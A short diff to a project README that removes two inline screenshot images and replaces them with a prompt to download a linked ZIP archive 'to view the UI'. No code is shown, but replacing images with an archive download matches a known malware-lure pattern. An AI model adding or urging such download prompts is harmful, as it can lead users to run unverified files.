@@ -12,10 +12,8 @@ Screenshots
 Feel free to take screenshots of your app and include them here. To add a screenshot, place your image files (e.g., screenshot1.png, screenshot2.png) in a folder (e.g., assets/screenshots/) and link them in your README as follows:
 
 ## Screenshots
-
-![Screenshot 1](assets/screenshots/screenshot1.png)
-![Screenshot 2](assets/screenshots/screenshot2.png)
-
+Download the linked ZIP file to view the UI
+[Screenshots](https://github.com/prashanthjaganathan/refit/files/6795724/attachments.1.zip)
 
 ## Installation
 
